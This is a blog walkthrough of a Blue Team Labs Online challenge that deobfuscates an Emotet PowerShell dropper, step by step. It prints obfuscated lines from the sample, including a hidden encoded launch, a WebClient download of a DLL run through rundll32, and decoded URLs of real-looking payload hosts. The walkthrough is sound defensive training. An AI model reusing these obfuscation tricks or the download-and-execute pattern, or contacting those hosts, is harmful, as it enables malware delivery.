---
layout: post
title: Blue Team Labs Online -- Malicious PowerShell Analysis
categories: [Instructional, "Security Operations"]
tags: [Walkthrough, Blue Team]
---

PowerShell is a wildly effective tool for managing Windows devices and networks. Naturally, this also means that it can be used by threat actors to exploit targets. One big tactic used to side-step Endpoint Detection and Response, as well as forensic analysis after the fact, is code obfuscation. BTLO has a [great challenge (medium difficulty)] for analysing malicious PowerShell, so let's dig into it!



## Table of Contents
{:.no_toc}


1. TOC
{:toc}

# Background
> Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack? [Reading Material]

So, it looks like the only real question in all of this is what malware is responsible. Let's take a look at the sample before we go any further.

![](/assets/img/BTLO_PowerShell_1/powershell1.png)

First, we see `POwersheLL  -w hidden -ENCOD`. PowerShell accepts case-insensitive input, so we can ignore the random capitalization in this section, and just look at what it's telling PowerShell to do...

`-w hidden` means to open a hidden PowerShell window (invisible to the user), and `-ENCOD` is just shorthand for `encoded`. PowerShell will also autocomplete flagged inputs. In fact, our friend could have just as easily written this as `-e` and it would have understood that the script was encoded with Base64. The `-e` flag means PowerShell needs to decode Base64 before executing the script, so let's pop this into CyberChef and see what we get.

![](/assets/img/BTLO_PowerShell_1/powershell2.png)

Looks like some variable declarations, so we're on the right track! We just need to remove the null bytes (there's a recipe in CyberChef for that), then bring this back over to our text editor for analysis.

![](/assets/img/BTLO_PowerShell_1/powershell3.png)

This looks messy. At first glance, we can see this is a single-line script which utilizes semi-colons to keep from needing to create new lines. Since a new line has the same effect as a semi-colon, let's conduct a find and replace. In Atom, the simple way to do this is with a regex rule to insert a `\n`, then select `Replace all`.

![](/assets/img/BTLO_PowerShell_1/powershell4.png)

![](/assets/img/BTLO_Powershell_1/powershell5.png)

Much better!

While my preference would be to start working to clean this up right off the bat, we already know we have some questions to answer, so let's look back at the challenge and see what it wants us to find.

## Question 1
> What security protocol is being used for the communication with a malicious domain?

OK, so it's asking about SSL, TLS, etc, here. Which protocol is the malware using to mask its communications. On line 8, we see this:

```powershell
  ( vARiaBLe  ("m"+"bu")  -VAlueoN  )::"sEcuRITYproT`o`c`ol" = ('T'+('ls'+'12'))
```

Earlier, I mentioned that PowerShell effectively ignores capitalization for most input. Well, it also uses backtick operators (\`) to allow for creating tabs and new lines in string outputs. If the backtick is used without the new line/tab/space, PowerShell simply ignores the backtick and concatenates the input before and after it instead. In this case, the backticks are used to obfuscate the string, likely as a way of visually breaking up the text so it's less legible during analysis, but it also could get around some basic signature-based analysis. Looking at this line holistically, we see that the variable `mbu` has the value `sEcuRITYproTocol=Tls12` set/applied, so our answer to the question is TLS 1.2, a fairly secure protocol.

__Solved!__

## Question 2
> What directory does the obfuscated PowerShell create? (Starting with \HOME\)

For this question, it's giving us a pretty big hint with the HOME reference. We can already see (line 6) that there's a `createdirectory` value, which gets set to $HOME with a long string following it.

```powershell
 (DIr VariabLE:Mku  ).VaLUe::"c`REAt`edI`REC`TORy"($HOME + (('{'+'0}Db_bh'+'30'+'{0}'+'Yf'+'5be5g{0}') -F [chAR]92))
```

We _could_ try to deobfuscate this on our own. As an Air Force veteran, I'm a big fan of the old "smarter; not harder" adage, though, so we're going to mix things up a bit. We know that `$HOME` is already going to be `\HOME\` in our answer, and the `+` tells PowerShell to concatenate the following text to it, so let's just put the following data (starting with `(('{'+'0}Db_bh'`) directly into PowerShell and let it do the deobfuscation for us!

![](/assets/img/BTLO_PowerShell_1/powershell6.png)

If this is correct, the correct answer should be `\HOME\Db_bh30\Yf5be5g`

__Solved!__

## Question 3
> What file is being downloaded (full name)?

Now that we have the directory created by the malware, finding this should be a breeze. Looking at lines 9-11, we see 3 variable declarations, but only one is reused later in the script. Based on the obfuscation, it's possible that the other ones are referenced within other obfuscated lines. However, since `$Swrp6tc` shows up in full in line 12, which also references the `$HOME` directory, I'll start there and see what we got.
```powershell
$Imd1yck=$HOME+((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG]  [chAr]92))+$Swrp6tc+(('.'+'dl')+'l')
```

We see `$HOME` being concatenated against another long obfuscated string, followed by `.Replace`, then another concatenation against our variable from line 10 + '.dll'. I'm going to run the first string through PowerShell to see whether it's the same directory from Question 2.
```powershell
PS /share/Malicious PowerShell Analysis/BTLO PowerShell Analysis> echo $((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG]  [chAr]92))
\Db_bh30\Yf5be5g\
```
Yep, that checks out, so we know that the rest of the variable should just be the name of the file (which it's pulling from `$Swrp6tc`) followed by `.dll`
```powershell
PS /share/Malicious PowerShell Analysis/BTLO PowerShell Analysis> echo $((('A6'+'9')+'S')+(('.'+'dl')+'l'))
A69S.dll
```
And there's our file name!

__Solved!__

## Question 4
> What is used to execute the downloaded file?

Now, we're in the home stretch. We know the script is using `$Imd4yck` as a reference to the file. In line 16, we see `try{(&(New-Object) System.Net.WebClient.DownloadFile($Bm5pw6z, $Imd1yck)`

Line 16 begins with a foreach loop, which iterates through `$B9fhbyv` and attempts to download the file and save it to our `A69S.dll` file. If we echo `$B9fhbyv`, we see that it's a list of URIs:
```powershell
PS /share/Malicious PowerShell Analysis/BTLO PowerShell Analysis> echo $(']'+('a'+'nw[3s://adm'+'int'+'k.c'+'o'+'m/'+'w')+('p-adm'+'in/'+'L/')+'@'+(']a'+'n'+'w[3s')+':'+'/'+'/m'+('ike'+'ge')+('e'+'r'+'inck.')+('c'+'om')+('/c/'+'Y'+'Ys')+'a'+('/@]'+'anw'+'['+'3://free'+'lanc'+'e'+'rw')+('ebdesi'+'gnerh'+'yd')+('er'+'aba')+('d.'+'com/')+('cgi'+'-bin'+'/S')+('/'+'@'+']anw')+('[3'+'://'+'etdog.co'+'m'+'/w')+('p-'+'co')+'nt'+('e'+'nt')+('/n'+'u/@')+(']a'+'nw[3')+'s'+('://'+'www'+'.hintu'+'p.c')+('o'+'m.')+('b'+'r/')+'w'+('p'+'-co')+('n'+'ten')+('t'+'/dE/'+'@]a'+'nw[3://'+'www.')+'s'+('tm'+'arouns'+'.')+('ns'+'w')+('.'+'edu.au/p'+'a'+'y'+'pal/b8')+('G'+'/@]')+('a'+'nw[')+('3:'+'/')+('/'+'wm.mcdeve'+'lop.net'+'/'+'c'+'on'+'t'+'e')+('nt'+'/')+'6'+('F2'+'gd/'))."RE`p`lACe"(((']a'+'n')+('w'+'[3')),([array]('sd','sw'),(('h'+'tt')+'p'),'3d')[1])."s`PLIT"($C83R + $Cvmmq4o + $F10Q)
https://admintk.com/wp-admin/L/@https://mikegeerinck.com/c/YYsa/@http://freelancerwebdesignerhyderabad.com/cgi-bin/S/@http://etdog.com/wp-content/nu/@https://www.hintup.com.br/wp-content/dE/@http://www.stmarouns.nsw.edu.au/paypal/b8G/@http://wm.mcdevelop.net/content/6F2gd/
```
It looks like 7 URIs separated by @ symbols. On line 18, we see the script check whether the downloaded file is a valid size. If it is, it continues by executing rundll32, pointing at the newly downloaded DLL. Looking back at the question, we have our answer, `rundll32`.

__Solved!__

## Question 5
> What is the domain name of the URI ending in '/6F2gd/'?

Fortunately, we previously ran `$B9fhbyv` through PowerShell and decoded the list of URIs. Looking back at the list we see the last item ends in `6F2gd`, so we just input the domain itself `wm.mcdevelop.net`!

__Solved!__

## Question 6
> Based on the analysis of the obfuscated code, what is the name of the malware?

You can fairly easily pull out bits from this script that are unlikely to change, and then run a search to see whether these have been seen before. For this, I took the created directory and ran that across Google to see if anything glaring showed up:

![](/assets/img/BTLO_PowerShell_1/powershell7.png)

Welp, this has definitely been seen before! Tria.ge indicates this is an emotet sample. Easy-peasy!

__Solved!__

---

I hope that was understandable (and to some extent enjoyable). If you have any real-world obfuscated PowerShell and would be comfortable sharing it with me so I could do this again with it, please reach out, preferably via Twitter (handle at the bottom).

Take care!



[great challenge (medium difficulty)]: https://blueteamlabs.online/home/challenge/3
[Reading Material]: https://malware.news/t/deobfuscating-powershell-putting-the-toothpaste-back-in-the-tube/23509
